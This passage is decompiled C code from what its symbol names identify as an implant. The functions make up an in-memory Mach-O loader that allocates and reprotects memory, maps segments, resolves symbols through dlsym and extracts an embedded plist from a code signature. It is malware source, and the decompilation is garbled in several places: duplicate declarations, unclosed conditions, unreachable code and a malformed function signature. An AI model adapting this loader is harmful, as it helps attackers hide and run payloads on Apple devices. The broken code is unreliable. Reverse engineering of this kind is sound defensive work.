}





uint64_t coruna_mach_vm_deallocate(long handle)
{
  uint u;
  kern_return_t lk2;
  uint64_t size;
  mach_vm_size_t size;
  uint64_t *ptr;
  byte err;
  long handle;
  mach_vm_address_t scratch;
  mach_vm_address_t bootargs;
  uint8_t *thread_attr;
  uint64_t host_info;
  void (*serial_buf)(void);
  uint8_t *action;
  uint64_t *block_ctx;
  uint64_t *stack_guard;
  uint64_t *sa_saved;
  uint64_t sa_new;
  uint64_t *path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t *url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t *cache;
  uint64_t cache_20;
  uint64_t cache_21;
  
  cache = &work;
  work = 0;
  cache_20 = k_implant_rodata_word_1e8c0;
  cache_21 = 0;
  url_buf = &plist;
  plist = 0;
  json_buf = k_implant_rodata_word_1e8c0;
  frame = 0;
  path_buf = &sa_new;
  sa_new = 0;
  tmp_buf = k_implant_rodata_word_1e8c0;
  region = 0;
  if (handle == 0) {
    size = 0xad000;
  }
  else {
    thread_attr = k_implant_nsconcretestackblock_slot;
    host_info = k_implant_rodata_word_1e8c8;
    serial_buf = coruna_macho_text_seg_12c74;
    action = &k_implant_rodata_word_202e8;
    block_ctx = cache;
    stack_guard = url_buf;
    sa_saved = path_buf;
    size = coruna_macho_foreach_loadcmd(handle,0x19,&thread_attr);
    ptr = url_buf;
    if ((int)size == 0) {
      bootargs = url_buf[3];
      if ((bootargs == 0) && (bootargs = 0, path_buf[3] != 0)) {
        bootargs = *(mach_vm_address_t *)(path_buf[3] + 0x18);
        url_buf[3] = bootargs;
      }
      if (*(char *)(handle + 0x1c2) == '\0') {
        size = cache[3];
        if (*(char *)(handle + 0x138) != '\0') {
          size = (long)(int)~(uint)*(long *)k_implant_vm_page_mask_slot &
                 *(long *)k_implant_vm_page_mask_slot + size;
          cache[3] = size;
        }
        lk2 = _mach_vm_allocate(*(vm_map_t *)k_implant_mach_task_self_slot,&bootargs,size,1);
        if (lk2 != 0) {
          size = 0x14004;
          __Block_object_dispose(&sa_new,8);
          __Block_object_dispose(&plist,8);
          __Block_object_dispose(&work,8);
          return size;
        }
        err = *(byte *)(handle + 0x1c2) ^ 1;
        ptr = url_buf;
      }
      else {
        err = 0;
        bootargs = *(mach_vm_address_t *)(handle + 0x148);
        cache[3] = *(uint64_t *)(handle + 0x150);
      }
      handle = ptr[3];
      *(mach_vm_address_t *)(handle + 8) = bootargs;
      *(long *)(handle + 0x168) = handle;
      u = *(uint *)(cache + 3);
      handle = bootargs - handle;
      *(unsigned long *)(handle + 0x10) = (unsigned long)u;
      *(long *)(handle + 0x18) = handle;
      *(byte *)(handle + 0xfa) = err;
      if (*(char *)(handle + 0x138) == '\0') {
        size = 0;
        *(unsigned long *)(handle + 0x48) = (unsigned long)u;
        *(long *)(handle + 0x50) = handle;
        *(mach_vm_address_t *)(handle + 0x40) = bootargs;
        *(uint8_t *)(handle + 0xfb) = 0;
      }
      else {
        scratch = 0;
        lk2 = _mach_vm_allocate(*(vm_map_t *)(handle + 0x58),&scratch,cache[3],1);
        if (lk2 == 0) {
          size = 0;
          *(mach_vm_address_t *)(handle + 0x40) = scratch;
          *(uint64_t *)(handle + 0x48) = cache[3];
          *(mach_vm_address_t *)(handle + 0x50) = scratch - *(long *)(handle + 0x168);
          *(uint8_t *)(handle + 0xfb) = 1;
        }
        else {
          size = 0x1400f;
          if (*(char *)(handle + 0x1c2) == '\0') {
            _mach_vm_deallocate(*(vm_map_t *)k_implant_mach_task_self_slot,bootargs,cache[3]);
            *(mach_vm_address_t *)(handle + 8) = 0;
            *(uint64_t *)(handle + 0x10) = 0;
          }
        }
      }
    }
  }
fail:
  __Block_object_dispose(&sa_new,8);
  __Block_object_dispose(&plist,8);
  __Block_object_dispose(&work,8);
  return size;
}





uint coruna_macho_unwind_info(long handle,int *flags)
{
  long handle;
  void *ptr;
  void *buf;
  int *err;
  int *status;
  char err;
  int err;
  uint u;
  ushort size;
  long addr;
  void *str;
  long off;
  uint64_t *ptr;
  void *copy;
  void *data;
  unsigned long version;
  int *flags;
  int *count;
  unsigned long port;
  uint64_t *buf;
  
  if (*flags != 0x19) {
    return 0;
  }
  buf = *(uint64_t **)(handle + 0x20);
  if (buf == (uint64_t *)0x0) {
    return 0xad001;
  }
  err = _strncmp((char *)(flags + 2),"__PAGEZERO",0xb);
  if (err == 0) {
    return 0;
  }
  err = _strncmp((char *)(flags + 2),"__LINKEDIT",0xb);
  addr = *(long *)(flags + 6);
  if (err == 0) {
    off = *(long *)(flags + 10);
    handle = buf[3] + addr;
    buf[0x23] = handle;
    buf[0x24] = handle - off;
    version = *(unsigned long *)(flags + 8);
    buf[0x25] = version;
  }
  else {
    off = *(long *)(flags + 10);
    version = *(unsigned long *)(flags + 8);
  }
  data = (void *)(buf[3] + addr);
  str = (void *)buf[1];
  if (str == (void *)0x0) {
    return 0x14006;
  }
  if (!CARRY8((unsigned long)data,version)) {
    port = *(unsigned long *)(flags + 0xc);
    if ((port <= version) && (-1 < (long)buf[0x2a])) {
      copy = (void *)buf[0x29];
      ptr = (void *)((long)copy + off);
      if (((copy <= ptr) &&
          ((((buf = (void *)((long)copy + buf[0x2a]), ptr < buf &&
             (-1 < (long)port)) && (copy <= (void *)((long)ptr + port))) &&
           (((void *)((long)ptr + port) <= buf && (-1 < (long)buf[2])))))) &&
         ((str <= data &&
          (((copy = (void *)((long)str + buf[2]), data < copy &&
            (-1 < (long)version)) && (str <= (void *)((long)data + version))))))) {
        if (copy < (void *)((long)data + version)) {
          return 0x14007;
        }
        err = coruna_mach_vm_protect_fec8(*buf,*(uint32_t *)k_implant_mach_task_self_slot,data,version,3,
                             0);
        if (err != 0) {
          return 0x14008;
        }
        _memcpy(data,ptr,port);
        _bzero((void *)(port + (long)data),version - port);
        str = _realloc((void *)buf[0x10],(unsigned long)(*(int *)(buf + 0x11) * 0x18 + 0x30));
        if (str != (void *)0x0) {
          buf[0x10] = str;
          ptr = (uint64_t *)((long)str + (unsigned long)*(uint *)(buf + 0x11) * 0x18);
          *(uint *)(buf + 0x11) = *(uint *)(buf + 0x11) + 1;
          ptr[1] = version;
          ptr[2] = 0;
          *ptr = data;
          if (*(long *)(flags + 10) == 0) {
            buf[0x20] = buf[3] + *(long *)(flags + 6);
          }
          u = flags[0x10];
          if (u == 0) {
            return 0;
          }
          version = 0;
          status = (int *)buf[0x29];
          addr = buf[0x2a];
          err = (int *)((long)status + addr);
          flags = flags + 0x26;
          do {
            if (addr < 0) {
              return 0x1400a;
            }
            count = flags + -0x14;
            if (count < status) {
              return 0x1400a;
            }
            if (err <= count) {
              return 0x1400a;
            }
            if (flags < status) {
              return 0x1400a;
            }
            if (err < flags) {
              return 0x1400a;
            }
            err = (char)flags[-4];
            size = 1;
            if ((err == '\t') || (err == '\x16')) {
              *(ushort *)(buf + 0x38) = *(ushort *)(buf + 0x38) | size;
              u = flags[0x10];
            }
            else {
              if (err == '\n') {
                size = 2;
                *(ushort *)(buf + 0x38) = *(ushort *)(buf + 0x38) | size;
                u = flags[0x10];
              }
              else {
                err = _strncmp((char *)count,"__eh_frame",0xb);
                if (err == 0) {
                  size = 8;
                  *(ushort *)(buf + 0x38) = *(ushort *)(buf + 0x38) | size;
                  u = flags[0x10];
                }
                else {
                  err = _strncmp((char *)count,"__unwind_info",0xe);
                  if (err == 0) {
                    size = 0x10;
                    *(ushort *)(buf + 0x38) = *(ushort *)(buf + 0x38) | size;
                    u = flags[0x10];
                  }
                }
              }
            }
            version = version + 1;
            flags = flags + 0x14;
            if (u <= version) {
              return 0;
            }
          } while( true );
        }
        u = 0x2015;
        return u | 0x10000;
      }
    }
  }
  u = 0x4007;
done:
  return u | 0x10000;
}





bool coruna_objc_empty_vtable(char *path)
{
  bool err;
  int err;
  
  err = false;
  if (path != (char *)0x0) {
    err = _strcmp(path,"dyld_stub_binder");
    if ((err == 0) || (err = _strcmp(path,"__objc_empty_vtable"), err == 0)) {
      err = true;
    }
    else {
      err = _strcmp(path,"_objc_readClassPair");
      err = err == 0;
    }
  }
  return err;
}





uint64_t
void coruna_objc_empty_vtable_107b4(long *handle,uint size,char *path,uint64_t val,int flags,unsigned long *arg)
{
  int err;
  unsigned long u;
  long handle;
  long addr;
  
  if (handle == (long *)0x0) {
    return 0xad001;
  }
  addr = *handle;
  if ((addr == 0 || path == (char *)0x0) || arg == (unsigned long *)0x0) {
    return 0xad001;
  }
  if (((*(void (**)(addr + 0xb0) != (void (*)0x0) &&
      (err = (**(void (**)(addr + 0xb0))(*(uint64_t *)(addr + 0xb8),path,val,arg),
      err == 0)) ||
     ((*(char *)(addr + 0x1c) != '\0' &&
      ((*(char *)((long)handle + 0x1c3) != '\0' &&
       *arg = *arg & 0x7fffffffff;
       return 0;
}





uint64_t coruna_dlerror(uint64_t val,long handle,char *path,long addr_2,long *off_3)
{
  char err;
  long handle;
  uint64_t u;
  
  u = 0x910006;
  if (((path != (char *)0x0) && (handle != 0)) && (off_3 != (long *)0x0)) {
    err = *path;
    _dlerror();
    if (err == '_') {
      path = path + 1;
    }
    handle = _dlsym(handle,path);
    _dlerror();
    *off_3 = 0;
    if (handle != 0) {
      u = 0;
      *off_3 = handle + addr_2;
    }
  }
  return u;
}





long coruna_macho_seg19_offset(long handle,int flags,int count_2)
{
  long handle;
  int err;
  int status;
  int *err;
  
  err = *(int *)(*(long *)(handle + 0x170) + 0x10);
  if (err != 0) {
    status = 0;
    err = (int *)(*(long *)(handle + 0x148) + 0x20);
    do {
      if (*err == 0x19) {
        if (status == flags) {
          handle = 0x50;
          if (count_2 == 0) {
            handle = 0x18;
          }
          return *(long *)(handle + handle) + *(long *)(err + 6);
        }
        status = status + 1;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      err = err + -1;
    } while (err != 0);
  }
  return 0;
}





uint64_t coruna_implant65fc_via_macho_foreach_loadcmd_4(long handle)
{
  uint8_t *ptr;
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  uint8_t *action;
  uint64_t block_ctx;
  void (*stack_guard)(void);
  uint8_t *sa_saved;
  long sa_new;
  
  ptr = k_implant_nsconcretestackblock_slot;
  if (handle == 0) {
    u = 0x17000;
  }
  else {
    if (*(long *)(handle + 0x120) == 0) {
      action = k_implant_nsconcretestackblock_slot;
      block_ctx = k_implant_rodata_word_1e8b0;
      stack_guard = coruna_macho_linkedit;
      sa_saved = &k_implant_rodata_word_20158;
      sa_new = handle;
      u = coruna_macho_foreach_loadcmd(handle,0x19,&action);
      if ((int)u != 0) {
        return u;
      }
    }
    scratch = ptr;
    bootargs = k_implant_rodata_word_1e8b0;
    thread_attr = coruna_implant65fc_str_usr_lib_libobjc_a_d;
    host_info = &k_implant_rodata_word_20178;
    serial_buf = handle;
    u = coruna_macho_foreach_loadcmd(handle,0,&scratch);
  }
  return u;
}





uint64_t coruna_macho_linkedit(long handle,long addr_2)
{
  long handle;
  uint64_t u;
  int err;
  long addr;
  long off;
  
  err = _strncmp((char *)(addr_2 + 8),"__LINKEDIT",0xb);
  if (err == 0) {
    addr = *(long *)(handle + 0x20);
    u = *(uint64_t *)(addr_2 + 0x20);
    handle = *(long *)(addr + 0x18) + *(long *)(addr_2 + 0x18);
    off = *(long *)(addr_2 + 0x28);
    *(long *)(addr + 0x118) = handle;
    *(long *)(addr + 0x120) = handle - off;
    *(uint64_t *)(addr + 0x128) = u;
  }
  return 0;
}





unsigned long coruna_implant65fc_str_usr_lib_libobjc_a_d(long arg,int *val)

{
  char *data;
  unsigned long size;
  bool count;
  int idx;
  long ctx_val;
  ushort tag;
  long serial;
  unsigned long type_id_13;
  unsigned long type_id;
  uint type_id_9;
  unsigned long type_id_14;
  long *block;
  uint64_t *obj;
  uint64_t **lppu14;
  uint64_t scratch;
  uint64_t *bootargs;
  uint64_t *thread_attr;
  uint8_t *host_info;
  long serial_buf;
  
  type_id_14 = 0;
  serial_buf = *(long *)k_implant_stack_chk_guard_slot;
  idx = *val;
  if (idx < 0xb) {
    if (-0x7fffffce < idx) {
      if (idx == -0x7fffffcd) {
        type_id_14 = 0;
        *(int **)(*(long *)(arg + 0x20) + 400) = val;
      }
      else if (idx == -0x7fffffcc) {
        type_id_14 = 0;
        *(int **)(*(long *)(arg + 0x20) + 0x198) = val;
      }
      else if (idx == 2) {
        type_id_14 = 0x17001;
        if (*(long *)(*(long *)(arg + 0x20) + 0x120) == 0) {
          type_id_14 = 0x17000;
        }
        else {
          *(int **)(*(long *)(arg + 0x20) + 0x1a0) = val;
          ctx_val = *(long *)(arg + 0x20);
          *(unsigned long *)(ctx_val + 0x1b8) =
               *(long *)(ctx_val + 0x120) + (unsigned long)*(uint *)(*(long *)(ctx_val + 0x1a0) + 0x10);
          ctx_val = *(long *)(arg + 0x20);
          if (*(char *)(ctx_val + 0x1c2) == '\0') {
            if (*(long *)k_implant_stack_chk_guard_slot != serial_buf) {
            ___stack_chk_fail();
            }
            return type_id_14;
            type_id_13 = *(unsigned long *)(ctx_val + 0x1b8);
            type_id = *(unsigned long *)(ctx_val + 8);
            if (((type_id_13 < type_id) || (size = type_id + *(long *)(ctx_val + 0x10), size <= type_id_13)) ||
               (serial = *(long *)(ctx_val + 0x1a0), type_id_13 = type_id_13 + *(uint *)(serial + 0x14),
               if (*(long *)k_implant_stack_chk_guard_slot != serial_buf) {
               ___stack_chk_fail();
               }
               return type_id_14;
          }
          else {
            serial = *(long *)(ctx_val + 0x1a0);
          }
          *(unsigned long *)(ctx_val + 0x1a8) = *(long *)(ctx_val + 0x120) + (unsigned long)*(uint *)(serial + 8);
          ctx_val = *(long *)(arg + 0x20);
          if (*(char *)(ctx_val + 0x1c2) == '\0') {
            type_id_9 = 0;
            if (*(long *)(ctx_val + 0x10) + *(unsigned long *)(ctx_val + 8) <= *(unsigned long *)(ctx_val + 0x1a8) ||
                *(unsigned long *)(ctx_val + 0x1a8) < *(unsigned long *)(ctx_val + 8)) {
              type_id_9 = 0x17001;
            }
            type_id_14 = (unsigned long)type_id_9;
          }
          else {
            type_id_14 = 0;
          }
        }
      }
      if (*(long *)k_implant_stack_chk_guard_slot != serial_buf) {
      ___stack_chk_fail();
      }
      return type_id_14;
    }
    if (idx != -0x7fffffe8) {
      if (*(long *)k_implant_stack_chk_guard_slot != serial_buf) {
      ___stack_chk_fail();
      }
      return type_id_14;
      type_id_14 = 0;
      *(int **)(*(long *)(arg + 0x20) + 0x188) = val;
      break;
    }
switchD_00010c68_caseD_c:
    type_id_14 = 0x17001;
    data = (char *)((long)val + (unsigned long)(uint)val[2]);
    block = *(long **)(arg + 0x20);
    if ((char *)block[0x29] <= data && data < (char *)block[0x29] + block[0x2a]) {
      type_id_14 = 0x17004;
      if (*block != 0) {
        obj = (uint64_t *)0x0;
        thread_attr = *(uint64_t **)(*block + 0xc0);
        host_info = &k_implant_rodata_word_24598;
        scratch = 0;
        bootargs = &k_implant_rodata_word_204c8;
        count = (char)block[0x27] != '\0';
        lppu14 = &thread_attr;
        if (count) {
          lppu14 = &bootargs;
        }
        ctx_val = 1;
        if (!count) {
          ctx_val = 2;
        }
        {
          bool skip_residual = false;
          do {
            if ((int)type_id_14 == 0x1200d) {
              skip_residual = true;
              break;
            }
            if (ctx_val == 0) {
              if ((int)type_id_14 != 0) {
                skip_residual = true;
                break;
              }
              break;
            }
            obj = *lppu14;
            if (obj != (uint64_t *)0x0) {
              scratch = 0;
              type_id_14 = (*(void (*)*obj)(obj,data,2,&scratch);
            }
            lppu14 = lppu14 + 1;
            ctx_val = ctx_val + -1;
          } while ((int)type_id_14 != 0);
          if (!skip_residual) {
            type_id_14 = coruna_implant65fc_residual_110(block,obj,scratch);
            if ((int)type_id_14 == 0) {
              ctx_val = *(long *)(arg + 0x20);
              if ((*(char *)(ctx_val + 0x138) == '\0') &&
                 (idx = _strncmp(data,"/usr/lib/libobjc.A.d",0x14), idx == 0)) {
                type_id_14 = 0;
                *(uint8_t *)(ctx_val + 0x79) = 1;
                *(uint8_t *)(ctx_val + 0x130) = 1;
                *(uint8_t *)(ctx_val + 0x110) = 1;
                if (*(long *)k_implant_stack_chk_guard_slot != serial_buf) {
                ___stack_chk_fail();
                }
                return type_id_14;
              }
              type_id_14 = 0;
            }
            else {
              (*(void (*)obj[1])(obj,scratch);
            }
          }
        }
      }
load_ok_40:
      if (*val == -0x7fffffe8) {
        idx = _strncmp(data,"/usr/local/lib/libobjc-env.dylib",0x20);
        type_id_9 = 0;
        if (idx != 0) {
          type_id_9 = (uint)type_id_14;
        }
        type_id_14 = (unsigned long)type_id_9;
      }
    }
    if (*(long *)k_implant_stack_chk_guard_slot != serial_buf) {
    ___stack_chk_fail();
    }
    return type_id_14;
  }
  switch(idx) {
  case 0xb:
    type_id_14 = 0;
    *(int **)(*(long *)(arg + 0x20) + 0x1b0) = val;
    break;
  case 0xc:
    break;
  case 0xd:
    type_id_14 = 0;
    *(int **)(*(long *)(arg + 0x20) + 0x180) = val;
    break;
  case 0xe:
    break;
  case 0xf:
    ctx_val = *(long *)(arg + 0x20);
    tag = *(ushort *)(ctx_val + 0x1c0) | 0x40;
    type_id_14 = 0;
    *(ushort *)(ctx_val + 0x1c0) = tag;
    break;
  default:
    if (idx != 0x1a) {
      if (idx != 0x22) break;
load_ok_39:
      type_id_14 = 0;
      *(int **)(*(long *)(arg + 0x20) + 0x188) = val;
      break;
    }
    ctx_val = *(long *)(arg + 0x20);
    tag = *(ushort *)(ctx_val + 0x1c0) | 4;
load_ok_41:
    type_id_14 = 0;
    *(ushort *)(ctx_val + 0x1c0) = tag;
  }
switchD_00010c68_caseD_e:
  if (*(long *)k_implant_stack_chk_guard_slot != serial_buf) {
    ___stack_chk_fail();
  }
  return type_id_14;
}





unsigned long coruna_plist_dict(long *arg)

{
  int *status;
  int *flags;
  uint type_id_8;
  int idx;
  char *str;
  char *obj;
  char *block;
  char *entry;
  size_t ls9;
  long *buf;
  char *entry_9;
  unsigned long type_id_15;
  unsigned long type_id_16;
  long addr;
  unsigned long type_id_10;
  uint8_t *cache_49;
  uint64_t cache_50;
  void (*cache_51)(void);
  uint8_t *cache_52;
  uint64_t *cache_53;
  uint64_t *cache_54;
  uint64_t *cache_55;
  uint64_t cache_56;
  uint64_t *cache_57;
  uint64_t cache_58;
  uint32_t cache_59;
  uint64_t stack_guard;
  uint64_t *sa_saved;
  uint64_t sa_new;
  uint32_t path_buf;
  uint64_t tmp_buf;
  uint64_t *region;
  uint64_t plist;
  uint8_t url_buf;
  uint32_t json_buf[2];
  char *cache_45;
  uint32_t scratch;
  uint32_t sa_saved;
  uint32_t bootargs[2];
  uint32_t *thread_attr;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  type_id_15 = 0xad001;
  if ((arg == (long *)0x0) || (buf = (long *)*arg, buf == (long *)0x0))
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
  return type_id_15;
  }
  ___stack_chk_fail();
  if ((*buf == 0) ||
     ((*(char *)((long)buf + 0x1d) == '\0' || buf[1] == 0 || (arg[0x23] == 0)))) {
    type_id_15 = 0;
    if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return type_id_15;
    }
    ___stack_chk_fail();
  }
  cache_53 = &tmp_buf;
  tmp_buf = 0;
  plist = k_implant_rodata_word_1e8c0;
  url_buf = 0;
  cache_54 = &stack_guard;
  stack_guard = 0;
  sa_new = k_implant_rodata_word_1e8c0;
  path_buf = 0;
  cache_55 = &cache_56;
  cache_56 = 0;
  cache_58 = k_implant_rodata_word_1e8c0;
  cache_59 = 0;
  cache_49 = k_implant_nsconcretestackblock_slot;
  cache_50 = k_implant_rodata_word_1e8c8;
  cache_51 = coruna_wire_store_u32_pair;
  cache_52 = &k_implant_rodata_word_20198;
  cache_57 = cache_55;
  sa_saved = cache_54;
  region = cache_53;
  idx = coruna_macho_foreach_loadcmd(arg,0x1d,&cache_49);
  type_id_15 = 0;
  if (idx == 0) {
    if (*(char *)(region + 3) == '\0') {
      type_id_15 = 0;
    }
    else {
      type_id_15 = 0xad014;
      if ((*(uint *)(sa_saved + 3) != 0) && (*(int *)(cache_57 + 3) != 0)) {
        status = (int *)((unsigned long)*(uint *)(sa_saved + 3) + arg[0x29]);
        if (*status != -0x3ff32106) {
          type_id_15 = 0;
        }
        else {
          type_id_10 = 0;
          do {
            type_id_8 = (status[2] & 0xff00ff00U) >> 8 | (status[2] & 0xff00ffU) << 8;
            if ((type_id_8 >> 0x10 | type_id_8 << 0x10) <= type_id_10) {
              type_id_15 = 0;
              break;
            }
          if (status[type_id_10 * 2 + 3] == 0x5000000) {
            type_id_8 = (status[type_id_10 * 2 + 4] & 0xff00ff00U) >> 8 |
                    (status[type_id_10 * 2 + 4] & 0xff00ffU) << 8;
            flags = (int *)((long)status + (unsigned long)(type_id_8 >> 0x10 | type_id_8 << 0x10));
            type_id_8 = (flags[1] & 0xff00ff00U) >> 8 | (flags[1] & 0xff00ffU) << 8;
            type_id_8 = type_id_8 >> 0x10 | type_id_8 << 0x10;
            if (*flags != 0x7171defa || type_id_8 < 9) {
              type_id_15 = 0xad014;
              break;
            }
            type_id_16 = (unsigned long)(type_id_8 - 8);
            str = _strndup((char *)(flags + 2),type_id_16);
            if (str == (char *)0x0) {
              type_id_15 = 0xad009;
              break;
            }
            obj = _strstr(str,"<dict>");
            if (obj == (char *)0x0) {
              obj = (char *)0x0;
              type_id_8 = 0xad014;
            }
            else {
              entry = (char *)0x0;
              entry_9 = obj;
              do {
                block = entry;
                entry = _strstr(entry_9,"</dict>");
                entry_9 = entry + 1;
              } while (entry != (char *)0x0);
              if (block == (char *)0x0) {
                obj = (char *)0x0;
                type_id_8 = 0xad014;
              }
              else {
                block[7] = '\0';
                obj = _strdup(obj);
                type_id_8 = 0xad009;
                if (obj != (char *)0x0) {
                  type_id_8 = 0;
                }
              }
            }
            type_id_15 = (unsigned long)type_id_8;
            _bzero(str,type_id_16);
            _free(str);
            if (type_id_8 != 0) break;
            type_id_15 = 0xad001;
            if ((obj != (char *)0x0) && (type_id_15 = 0xad001, *obj != '\0')) {
              buf = (long *)*arg;
              type_id_15 = 0xad001;
              if (buf != (long *)0x0) {
                addr = *buf;
                type_id_15 = 0xad001;
                if (addr != 0) {
                  json_buf[0] = (uint32_t)arg[0xb];
                  cache_45 = obj;
                  ls9 = _strlen(obj);
                  scratch = (uint32_t)ls9;
                  sa_saved = 1;
                  bootargs[0] = 0x40000010;
                  thread_attr = json_buf;
                  type_id_15 = (**(void (**)(addr + 0x40))(addr,buf + 1,bootargs,1,0);
                }
              }
            }
            ls9 = _strlen(obj);
            _bzero(obj,ls9);
            _free(obj);
          }
          else {
            type_id_15 = 0;
          }
          type_id_10 = type_id_10 + 1;
        } while ((int)type_id_15 == 0);
        }
      }
    }
  }
  __Block_object_dispose(&cache_56,8);
  __Block_object_dispose(&stack_guard,8);
  __Block_object_dispose(&tmp_buf,8);
load_ok_42:
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return type_id_15;
  }
  ___stack_chk_fail();
}





uint64_t coruna_wire_store_u32_pair(long handle,long addr_2)
{
  *(uint8_t *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) = 1;
  *(uint32_t *)(*(long *)(*(long *)(handle + 0x28) + 8) + 0x18) = *(uint32_t *)(addr_2 + 8);
  *(uint32_t *)(*(long *)(*(long *)(handle + 0x30) + 8) + 0x18) = *(uint32_t *)(addr_2 + 0xc);
  return 0;
}





void coruna_block_assign_11358(long handle,long addr_2)
{
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),8);
  __Block_object_assign((void *)(handle + 0x28),*(void **)(addr_2 + 0x28),8);
  __Block_object_assign((void *)(handle + 0x30),*(void **)(addr_2 + 0x30),8);
  return;
}





void coruna_block_dispose_113a4(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x30),8);
  __Block_object_dispose(*(void **)(handle + 0x28),8);
  __Block_object_dispose(*(void **)(handle + 0x20),8);
  return;
}





uint64_t coruna_getattrlistbulk_paths(long *handle)
{
  int *err;
  long handle;
  int *status;
  long addr;
  uint u;
  uint size;
  unsigned long version;
  uint64_t port;
  unsigned long tag;
  int *flags;
  unsigned long kind;
  long off;
  unsigned long type_id;
  uint type_id_8;
  unsigned long type_id_9;
  int *count;
  
  port = 0xad001;
  if ((((handle != (long *)0x0) && (flags = (int *)handle[0x29], flags != (int *)0x0)) &&
      (kind = handle[0x2a], kind != 0)) && ((*handle != 0 && (8 < kind)))) {
    if (*flags == -0x35014542 || *flags == -0x41450136) {
      port = 0x12006;
      u = flags[1];
      if (u != 0) {
        type_id_8 = 0;
        type_id = 0;
        off = 0;
        u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
        type_id_9 = (unsigned long)(u >> 0x10 | u << 0x10);
        err = (int *)((long)flags + kind);
        count = flags + 7;
        do {
          if ((long)kind < 0) {
            return 0x12004;
          }
          if (count + -5 < flags) {
            return 0x12004;
          }
          if (err <= count + -5) {
            return 0x12004;
          }
          if (count < flags) {
            return 0x12004;
          }
          if (err < count) {
            return 0x12004;
          }
          u = (count[-3] & 0xff00ff00U) >> 8 | (count[-3] & 0xff00ffU) << 8;
          tag = (unsigned long)(u >> 0x10 | u << 0x10);
          if ((long)kind <= (long)tag) {
            return 0x12005;
          }
          u = (count[-2] & 0xff00ff00U) >> 8 | (count[-2] & 0xff00ffU) << 8;
          version = (unsigned long)(u >> 0x10 | u << 0x10);
          handle = (long)flags + tag;
          status = (int *)(handle + version);
          if (status < flags || err < status) {
            return 0x12005;
          }
          if (count[-5] == 0xc000001) {
            u = (count[-4] & 0xff00ff00U) >> 8;
            u = (u | (count[-4] & 0xff0000U) << 8) >> 0x10 | u << 0x10;
            addr = off;
            tag = type_id;
            size = type_id_8;
            if (type_id_8 <= u) {
              addr = handle;
              tag = version;
              size = u;
            }
            if ((int)u <= *(int *)(*handle + 0x18)) {
              off = addr;
              type_id = tag;
              type_id_8 = size;
            }
          }
          count = count + 5;
          type_id_9 = type_id_9 - 1;
        } while (type_id_9 != 0);
        port = 0x12006;
        if (off != 0) {
          port = 0;
          handle[0x29] = off;
          handle[0x2a] = type_id;
          handle[0x2c] = 0;
        }
      }
    }
    else {
      port = 0;
    }
  }
  return port;
}





uint64_t coruna_bzero_6(long handle)
{
  long *ptr;
  char err;
  byte err;
  ushort u;
  void *buf;
  void *str;
  long *copy;
  void *data;
  unsigned long size;
  uint version;
  long handle;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  long addr;
  
  if (handle == 0) {
    return 0x12011;
  }
  addr = *(long *)(handle + 0x1a8);
  if (((addr != 0) && (data = *(void **)(handle + 0x1b8), data != (void *)0x0)) &&
     (handle = *(long *)(handle + 0x1a0), handle != 0)) {
    version = *(uint *)(handle + 0xc);
    kind = (unsigned long)version;
    if ((version != 0) && (*(int *)(handle + 0x14) - 1U < 0x1fffffff)) {
      size = (unsigned long)(version << 4);
      buf = _calloc(size,1);
      if (buf == (void *)0x0) {
        return 0xad009;
      }
      version = *(uint *)(handle + 0x14);
      port = (unsigned long)version;
      str = data;
      if (*(char *)(handle + 0x1c2) == '\0') {
        str = _malloc(port);
        if (str == (void *)0x0) {
          _bzero(buf,size);
          _free(buf);
          return 0xad009;
        }
        _memcpy(str,data,port);
      }
      tag = 0;
      err = *(char *)(handle + 0x1c4);
      copy = (long *)(addr + 8);
      do {
        err = *(byte *)((long)copy + -4);
        if (((err != '\0') || ((err & 1) != 0)) && ((err & 0xe) != 0 && (err & 0xe0) == 0))
        {
          addr = *copy;
          handle = *(long *)(handle + 0x50);
          u = *(ushort *)((long)copy + -2);
          ptr = (long *)((long)buf + tag * 0x10);
          *ptr = (long)str + (unsigned long)*(uint *)(copy + -1);
          ptr[1] = handle + addr | (unsigned long)(u >> 3) & 1;
          tag = (unsigned long)((int)tag + 1);
        }
        copy = copy + 2;
        kind = kind - 1;
      } while (kind != 0);
      if ((*(uint *)(handle + 0xb0) != 0) && (*(void **)(handle + 0xa8) != (void *)0x0)) {
        _bzero(*(void **)(handle + 0xa8),(unsigned long)*(uint *)(handle + 0xb0) << 4);
        _free(*(void **)(handle + 0xa8));
      }
      if (((*(char *)(handle + 0xc4) == '\0') && (*(uint *)(handle + 0xc0) != 0)) &&
         (*(void **)(handle + 0xb8) != (void *)0x0)) {
        _bzero(*(void **)(handle + 0xb8),(unsigned long)*(uint *)(handle + 0xc0));
        _free(*(void **)(handle + 0xb8));
      }
      if ((int)tag == 0) {
        if (*(char *)(handle + 0x1c2) == '\0') {
          _bzero(str,port);
          _free(str);
        }
        _bzero(buf,size);
        _free(buf);
        buf = (void *)0x0;
        version = 0;
        str = (void *)0x0;
      }
      *(int *)(handle + 0xb0) = (int)tag;
      *(void **)(handle + 0xa8) = buf;
      *(void **)(handle + 0xb8) = str;
      *(uint *)(handle + 0xc0) = version;
      *(uint8_t *)(handle + 0xc4) = *(uint8_t *)(handle + 0x1c2);
      return 0;
    }
  }
  return 0;
}





uint32_t coruna_implant65fc_residual_111(long handle,char *path,uint64_t *val)
{
  int err;
  uint32_t u;
  unsigned long size;
  uint64_t *ptr;
  
  u = 0x12011;
  if (((handle != 0) && (path != (char *)0x0)) && (val != (uint64_t *)0x0)) {
    size = (unsigned long)*(uint *)(handle + 0xb0);
    if (*(uint *)(handle + 0xb0) != 0) {
      ptr = (uint64_t *)(*(long *)(handle + 0xa8) + 8);
      do {
        err = _strcmp((char *)ptr[-1],path);
        if (err == 0) {
          *val = *ptr;
          return 0;
        }
        ptr = ptr + 2;
        size = size - 1;
      } while (size != 0);
    }
